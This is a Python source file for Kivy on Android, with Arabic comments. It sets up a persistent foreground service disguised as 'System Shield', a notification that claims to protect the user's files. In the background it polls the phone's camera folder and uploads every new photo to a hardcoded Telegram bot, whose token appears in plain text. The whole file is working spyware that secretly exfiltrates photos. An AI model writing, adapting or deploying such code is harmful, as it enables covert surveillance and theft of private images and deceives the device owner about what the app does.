import os
import time
import requests
from jnius import autoclass

# --- إعدادات التلجرام الخاصة بك ---
TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
CHAT_ID = "-1003535367279"

is_running = True
sent_files = set()

def setup_foreground_service():
    """إنشاء قناة إشعار رسمية وتشغيل الخدمة في الوضع الأمامي لضمان البقاء في الخلفية"""
    try:
        PythonService = autoclass('org.kivy.android.PythonService')
        service_ctx = PythonService.mService
        
        # استدعاء كلاسات أندرويد لإدارة الإشعارات
        NotificationManager = autoclass('android.app.NotificationManager')
        NotificationChannel = autoclass('android.app.NotificationChannel')
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        Context = autoclass('android.content.Context')
        
        channel_id = 'sh1_monitor_channel'
        channel_name = 'System Protection Service'
        
        # 1. إنشاء القناة (إلزامي لأندرويد 12 و 13 لكي لا يتم قتل الخدمة)
        importance = NotificationManager.IMPORTANCE_LOW
        channel = NotificationChannel(channel_id, channel_name, importance)
        channel.setDescription("تأمين عمل نظام المراقبة في الخلفية")
        
        notification_manager = service_ctx.getSystemService(Context.NOTIFICATION_SERVICE)
        notification_manager.createNotificationChannel(channel)
        
        # 2. بناء الإشعار الدائم الذي يظهر للمستخدم
        notification = NotificationBuilder(service_ctx, channel_id) \
            .setContentTitle("🛡️ System Shield: ACTIVE") \
            .setContentText("نظام المراقبة يعمل بنجاح ويحمي ملفاتك") \
            .setSmallIcon(service_ctx.getApplicationInfo().icon) \
            .setOngoing(True) \
            .build()
            
        # 3. تفعيل وضع "الخدمة الأمامية" وإعادة التشغيل التلقائي (Sticky)
        service_ctx.setAutoRestartService(True)
        service_ctx.startForeground(1, notification)
        
    except Exception as e:
        print(f"Notification Error: {e}")

def send_as_document(photo_path, file_name):
    """إرسال الصورة كملف Document للحفاظ على الجودة الكاملة"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(photo_path, 'rb') as doc_file:
            payload = {
                'chat_id': CHAT_ID,
                'caption': f"📄 ملف جديد ملتقط:\n{file_name}"
            }
            files = {'document': doc_file}
            requests.post(url, files=files, data=payload, timeout=30)
    except:
        pass

def monitor_camera():
    global is_running, sent_files
    path = "/storage/emulated/0/DCIM/Camera"
    
    # تجاهل الصور الموجودة مسبقاً قبل تشغيل البوت
    if os.path.exists(path):
        known_files = set(os.listdir(path))
    else:
        known_files = set()

    while is_running:
        try:
            if os.path.exists(path):
                current_files = set(os.listdir(path))
                # تحديد الصور الجديدة فقط
                new_files = current_files - known_files - sent_files
                
                for file in new_files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                        sent_files.add(file)
                        full_path = os.path.join(path, file)
                        time.sleep(2) # انتظار اكتمال حفظ الصورة في الذاكرة
                        send_as_document(full_path, file)
                
                known_files.update(current_files)
        except:
            pass
        time.sleep(5) # فحص المجلد كل 5 ثوانٍ

if __name__ == '__main__':
    setup_foreground_service()
    monitor_camera()
